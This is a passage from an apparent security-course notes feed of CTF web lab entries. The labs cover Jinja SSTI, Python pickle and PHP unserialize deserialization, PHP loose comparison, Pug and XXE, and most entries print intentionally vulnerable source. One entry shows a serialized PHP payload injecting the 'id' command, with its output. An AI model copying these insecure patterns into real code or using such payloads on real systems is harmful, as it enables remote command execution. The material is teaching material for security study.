&lt;p>:::spoiler server_app.py&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import pickle

serialized = bytes.fromhex(input(&amp;#39;Data: &amp;#39;))
pickle.loads(serialized)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x15(Lab - `Jinja`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/</guid><description>&lt;h1 id="simple-web-0x15lab---jinja">
 Simple Web 0x15(Lab - &lt;code>Jinja&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x15lab---jinja">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8700/">http://h4ck3r.quest:8700/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/_hasOTGximc?t=5863">Web Security 0x1&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, render_template_string, request, send_file

app = Flask(__name__)


@app.get(&amp;#34;/&amp;#34;)
def home():
 return render_template_string(&amp;#34;&amp;#34;&amp;#34;
 &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;Your name&amp;#34;&amp;gt;
 &amp;lt;button&amp;gt;submit&amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;/source&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
 &amp;#34;&amp;#34;&amp;#34;)


@app.post(&amp;#34;/&amp;#34;)
def welcome_message():
 name = request.form.get(&amp;#39;name&amp;#39;)
 return render_template_string(&amp;#34;&amp;lt;p&amp;gt;Hello, &amp;#34; + name + &amp;#34;&amp;lt;/p&amp;gt;&amp;#34;)


@app.get(&amp;#34;/source&amp;#34;)
def source():
 return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)


if __name__ == &amp;#39;__main__&amp;#39;:
 app.run(threaded=True, debug=True)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16.5(php unserialize)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</guid><description>&lt;h1 id="simple-web-0x165php-unserialize">
 Simple Web 0x16.5(php unserialize)
 &lt;a class="anchor" href="#simple-web-0x165php-unserialize">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>php magic method
&lt;img src="https://i.imgur.com/xQrh7vo.png" alt="" />&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">class cat
{
 public $sound = &amp;#39;ls&amp;#39;;
 function __wakeup()
 {
 system(&amp;#34;echo&amp;#34;.$this-&amp;gt;sound);
 }
}
$cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
&lt;/code>&lt;/pre>&lt;h2 id="description--analyze">
 Description &amp;amp; Analyze
 &lt;a class="anchor" href="#description--analyze">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ php -a
php &amp;gt; class cat
php &amp;gt; public {
php { public $sound = &amp;#39;ls&amp;#39;;
php { function __wakeup()
php { {
php { system(&amp;#34;echo &amp;#34;.$this-&amp;gt;sound);
php { }
php { }
php &amp;gt; $_GET[&amp;#39;cat&amp;#39;]=&amp;#39;O:3:&amp;#34;cat&amp;#34;:1:{s:5:&amp;#34;sound&amp;#34;;s:4:&amp;#34;meow&amp;#34;;}&amp;#39;;
php &amp;gt; $cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
meow
php &amp;gt; $_GET[&amp;#39;cat&amp;#39;]=&amp;#39;O:3:&amp;#34;cat&amp;#34;:1:{s:5:&amp;#34;sound&amp;#34;;s:4:&amp;#34;;id;&amp;#34;;}&amp;#39;;
php &amp;gt; $cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);

uid=1000(sbk6401) gid=1000(sbk6401) groups=1000(sbk6401),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
&lt;/code>&lt;/pre>&lt;p>This is a typical command injection. The magic method &lt;code>__wakeup()&lt;/code> will be called when unserialized something.&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
 Simple Web 0x16(Lab - Pickle)
 &lt;a class="anchor" href="#simple-web-0x16lab---pickle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8600/">http://h4ck3r.quest:8600/&lt;/a>
Note: open a brand new window that haven&amp;rsquo;t login &lt;code>http://h4ck3r.quest&lt;/code>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/IcoQql7UQiegLv8KtK2wOw">0x15.5(Pickle)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
import base64
import pickle

app = Flask(__name__)


@app.route(&amp;#34;/sauce&amp;#34;)
def sauce():
 return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)


@app.route(&amp;#34;/&amp;#34;)
def main():
 session = request.cookies.get(&amp;#34;session&amp;#34;)
 if session == None:
 return &amp;#39;&amp;lt;form action=&amp;#34;/login&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Name: &amp;lt;input name=&amp;#34;name&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Age: &amp;lt;input name=&amp;#34;age&amp;#34; type=&amp;#34;number&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;button&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;a href=&amp;#34;/sauce&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;#39;

 else:
 user = pickle.loads(base64.b64decode(session))
 return f&amp;#39;&amp;lt;p&amp;gt;Name: {user[&amp;#34;name&amp;#34;]}&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Age: {user[&amp;#34;age&amp;#34;]}&amp;lt;/p&amp;gt;&amp;#39;


@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
def login():
 user = base64.b64encode(pickle.dumps({
 &amp;#34;name&amp;#34;: request.form.get(&amp;#39;name&amp;#39;),
 &amp;#34;age&amp;#34;: int(request.form.get(&amp;#39;age&amp;#39;))
 }))
 resp = make_response(redirect(&amp;#39;/&amp;#39;))
 resp.set_cookie(&amp;#34;session&amp;#34;, user)
 return resp
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
 Simple Web 0x16(Lab - Pickle)
 &lt;a class="anchor" href="#simple-web-0x16lab---pickle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8600/">http://h4ck3r.quest:8600/&lt;/a>
Note: open a brand new window that haven&amp;rsquo;t login &lt;code>http://h4ck3r.quest&lt;/code>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/IcoQql7UQiegLv8KtK2wOw">0x15.5(Pickle)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
import base64
import pickle

app = Flask(__name__)


@app.route(&amp;#34;/sauce&amp;#34;)
def sauce():
 return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)


@app.route(&amp;#34;/&amp;#34;)
def main():
 session = request.cookies.get(&amp;#34;session&amp;#34;)
 if session == None:
 return &amp;#39;&amp;lt;form action=&amp;#34;/login&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Name: &amp;lt;input name=&amp;#34;name&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Age: &amp;lt;input name=&amp;#34;age&amp;#34; type=&amp;#34;number&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;button&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;a href=&amp;#34;/sauce&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;#39;

 else:
 user = pickle.loads(base64.b64decode(session))
 return f&amp;#39;&amp;lt;p&amp;gt;Name: {user[&amp;#34;name&amp;#34;]}&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Age: {user[&amp;#34;age&amp;#34;]}&amp;lt;/p&amp;gt;&amp;#39;


@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
def login():
 user = base64.b64encode(pickle.dumps({
 &amp;#34;name&amp;#34;: request.form.get(&amp;#39;name&amp;#39;),
 &amp;#34;age&amp;#34;: int(request.form.get(&amp;#39;age&amp;#39;))
 }))
 resp = make_response(redirect(&amp;#39;/&amp;#39;))
 resp.set_cookie(&amp;#34;session&amp;#34;, user)
 return resp
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
 Simple Web 0x17(Lab - Baby Cat)
 &lt;a class="anchor" href="#simple-web-0x17lab---baby-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8601/">http://h4ck3r.quest:8601/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/FkF8p-zrSMSOWFkE4vvAJQ">0x16.5(php unserialize)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Cat
{
 public $name = &amp;#39;(guest cat)&amp;#39;;
 function __construct($name)
 {
 $this-&amp;gt;name = $name;
 }
 function __wakeup()
 {
 echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;;
 system(&amp;#34;cowsay &amp;#39;Welcome back, $this-&amp;gt;name&amp;#39;&amp;#34;);
 echo &amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;;
 }
}

if (!isset($_COOKIE[&amp;#39;cat_session&amp;#39;])) {
 $cat = new Cat(&amp;#34;cat_&amp;#34; . rand(0, 0xffff));
 setcookie(&amp;#39;cat_session&amp;#39;, base64_encode(serialize($cat)));
} else {
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat_session&amp;#39;]));
}
?&amp;gt;
&amp;lt;p&amp;gt;Hello, &amp;lt;?= $cat-&amp;gt;name ?&amp;gt;.&amp;lt;/p&amp;gt;
&amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;source code&amp;lt;/a&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
 Simple Web 0x17(Lab - Baby Cat)
 &lt;a class="anchor" href="#simple-web-0x17lab---baby-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8601/">http://h4ck3r.quest:8601/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/FkF8p-zrSMSOWFkE4vvAJQ">0x16.5(php unserialize)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Cat
{
 public $name = &amp;#39;(guest cat)&amp;#39;;
 function __construct($name)
 {
 $this-&amp;gt;name = $name;
 }
 function __wakeup()
 {
 echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;;
 system(&amp;#34;cowsay &amp;#39;Welcome back, $this-&amp;gt;name&amp;#39;&amp;#34;);
 echo &amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;;
 }
}

if (!isset($_COOKIE[&amp;#39;cat_session&amp;#39;])) {
 $cat = new Cat(&amp;#34;cat_&amp;#34; . rand(0, 0xffff));
 setcookie(&amp;#39;cat_session&amp;#39;, base64_encode(serialize($cat)));
} else {
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat_session&amp;#39;]));
}
?&amp;gt;
&amp;lt;p&amp;gt;Hello, &amp;lt;?= $cat-&amp;gt;name ?&amp;gt;.&amp;lt;/p&amp;gt;
&amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;source code&amp;lt;/a&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
 Simple Web 0x18(Lab - Magic Cat)
 &lt;a class="anchor" href="#simple-web-0x18lab---magic-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8602/">http://h4ck3r.quest:8602/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>None&amp;hellip;&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=&lt;?php" data-lang="php=&lt;?php">isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Magic
{
 function cast($spell)
 {
 echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;MAGIC, $spell!&amp;#39;);&amp;lt;/script&amp;gt;&amp;#34;;
 }
}

// Useless class?
class Caster
{
 public $cast_func = &amp;#39;intval&amp;#39;;
 function cast($val)
 {
 return ($this-&amp;gt;cast_func)($val);
 }
}


class Cat
{
 public $magic;
 public $spell;
 function __construct($spell)
 {
 $this-&amp;gt;magic = new Magic();
 $this-&amp;gt;spell = $spell;
 }
 function __wakeup()
 {
 echo &amp;#34;Cat Wakeup!\n&amp;#34;;
 $this-&amp;gt;magic-&amp;gt;cast($this-&amp;gt;spell);
 }
}

if (isset($_GET[&amp;#39;spell&amp;#39;])) {
 $cat = new Cat($_GET[&amp;#39;spell&amp;#39;]);
} else if (isset($_COOKIE[&amp;#39;cat&amp;#39;])) {
 echo &amp;#34;Unserialize...\n&amp;#34;;
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat&amp;#39;]));
} else {
 $cat = new Cat(&amp;#34;meow-meow-magic&amp;#34;);
}
?&amp;gt;
&amp;lt;pre&amp;gt;
This is your 🐱:
&amp;lt;?php var_dump($cat) ?&amp;gt;
&amp;lt;/pre&amp;gt;

&amp;lt;p&amp;gt;Usage:&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?source&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?spell=the-spell-of-your-cat&amp;lt;/p&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
 Simple Web 0x18(Lab - Magic Cat)
 &lt;a class="anchor" href="#simple-web-0x18lab---magic-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8602/">http://h4ck3r.quest:8602/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>None&amp;hellip;&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=&lt;?php" data-lang="php=&lt;?php">isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Magic
{
 function cast($spell)
 {
 echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;MAGIC, $spell!&amp;#39;);&amp;lt;/script&amp;gt;&amp;#34;;
 }
}

// Useless class?
class Caster
{
 public $cast_func = &amp;#39;intval&amp;#39;;
 function cast($val)
 {
 return ($this-&amp;gt;cast_func)($val);
 }
}


class Cat
{
 public $magic;
 public $spell;
 function __construct($spell)
 {
 $this-&amp;gt;magic = new Magic();
 $this-&amp;gt;spell = $spell;
 }
 function __wakeup()
 {
 echo &amp;#34;Cat Wakeup!\n&amp;#34;;
 $this-&amp;gt;magic-&amp;gt;cast($this-&amp;gt;spell);
 }
}

if (isset($_GET[&amp;#39;spell&amp;#39;])) {
 $cat = new Cat($_GET[&amp;#39;spell&amp;#39;]);
} else if (isset($_COOKIE[&amp;#39;cat&amp;#39;])) {
 echo &amp;#34;Unserialize...\n&amp;#34;;
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat&amp;#39;]));
} else {
 $cat = new Cat(&amp;#34;meow-meow-magic&amp;#34;);
}
?&amp;gt;
&amp;lt;pre&amp;gt;
This is your 🐱:
&amp;lt;?php var_dump($cat) ?&amp;gt;
&amp;lt;/pre&amp;gt;

&amp;lt;p&amp;gt;Usage:&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?source&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?spell=the-spell-of-your-cat&amp;lt;/p&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x19(Lab - PHP Login)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/</guid><description>&lt;h1 id="simple-web-0x19lab---php-login">
 Simple Web 0x19(Lab - PHP Login)
 &lt;a class="anchor" href="#simple-web-0x19lab---php-login">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8081">http://h4ck3r.quest:8081&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
// BSides Ahmedabad CTF 2021: entrance

include &amp;#39;flag.php&amp;#39;;
$users = array(
 &amp;#34;admin&amp;#34; =&amp;gt; &amp;#34;ed2b7b57b3b5be3e8d4246c69e4b513608ffb352&amp;#34;,
 &amp;#34;guest&amp;#34; =&amp;gt; &amp;#34;35675e68f4b5af7b995d9205ad0fc43842f16450&amp;#34;
);

function lookup($username) {
 global $users;
 return array_key_exists($username, $users) ? $users[$username] : &amp;#34;&amp;#34;;
}

if (!empty($_POST[&amp;#39;username&amp;#39;]) &amp;amp;&amp;amp; !empty($_POST[&amp;#39;password&amp;#39;])) {
 $sha1pass = lookup($_POST[&amp;#39;username&amp;#39;]);
 if ($sha1pass == sha1($_POST[&amp;#39;password&amp;#39;])) {
 if ($_POST[&amp;#39;username&amp;#39;] !== &amp;#39;guest&amp;#39;) echo $FLAG;
 else echo &amp;#39;Welcome guest!&amp;#39;;
 } else {
 echo &amp;#39;Login Failed!&amp;#39;;
 }
} else {
 echo &amp;#34;You can login with guest:guest&amp;#34;;
}
echo &amp;#34;&amp;lt;br&amp;gt;\n&amp;#34;;
highlight_file(__file__);
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Must change &lt;code>GET&lt;/code> method to &lt;code>POST&lt;/code> method and add &lt;code>Content-Type: application/x-www-form-urlencoded&lt;/code> in header&lt;/p></description></item><item><title>Simple Web 0x22(Lab - Pug)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/</guid><description>&lt;h1 id="simple-web-0x22lab---pug">
 Simple Web 0x22(Lab - Pug)
 &lt;a class="anchor" href="#simple-web-0x22lab---pug">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8008">http://h4ck3r.quest:8008&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const express = require(&amp;#39;express&amp;#39;);
const pug = require(&amp;#39;pug&amp;#39;);

const app = express();

const template = `
h1 Hello %NAME%
form(method=&amp;#39;GET&amp;#39; action=&amp;#39;/&amp;#39;)
 div
 label(for=&amp;#39;nickname&amp;#39;) Name:
 input#nickname(type=&amp;#39;text&amp;#39;, placeholder=&amp;#39;Nickname&amp;#39; name=&amp;#39;name&amp;#39;)
 button(type=&amp;#39;submit&amp;#39;) Submit 
 a(href=&amp;#39;/source&amp;#39;) Source Code
`;

app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; {
 const name = (req.query.name ?? &amp;#39;Anonymous&amp;#39;).toString();
 if (name.includes(&amp;#39;{&amp;#39;)) return res.send(&amp;#39;Nice try&amp;#39;);
 let html = pug.render(template.replace(&amp;#39;%NAME%&amp;#39;, name));
 res.set(&amp;#39;Content-Type&amp;#39;, &amp;#39;text/html&amp;#39;);
 res.send(html);
});

app.get(&amp;#34;/source&amp;#34;, (_, res) =&amp;gt; {
 res.sendFile(__filename);
});

app.listen(3000, () =&amp;gt; console.log(&amp;#39;:3000&amp;#39;));
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
 Simple Web 0x23(Lab - XXE)
 &lt;a class="anchor" href="#simple-web-0x23lab---xxe">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8604/">http://h4ck3r.quest:8604/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.w3schools.com/xml/xml_tree.asp">XML Tree&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_parser.asp">XML Parser&lt;/a>
&lt;a href="https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp">AJAX - Server Response&lt;/a>
